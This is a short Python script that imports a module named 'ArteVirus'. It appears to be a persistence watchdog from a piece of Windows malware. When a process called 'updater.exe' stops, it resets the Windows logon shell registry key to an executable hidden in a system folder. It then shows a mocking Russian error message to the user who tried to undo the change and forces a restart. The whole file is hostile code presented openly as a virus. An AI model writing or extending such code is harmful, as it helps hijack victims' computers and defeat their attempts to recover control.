import time
from tkinter import messagebox
import ArteVirus
time.sleep(3)
while True:
    if not ArteVirus.is_process_running("updater.exe"):
        ArteVirus.change_shell_key(fr"{ArteVirus.get_path(r"C:\Windows\Microsoft\Windows")}\errorHandler.exe")
        messagebox.showerror("conhost", "Ты серьёзно думал что просто изменешь winlogon?")
        ArteVirus.restart_pc()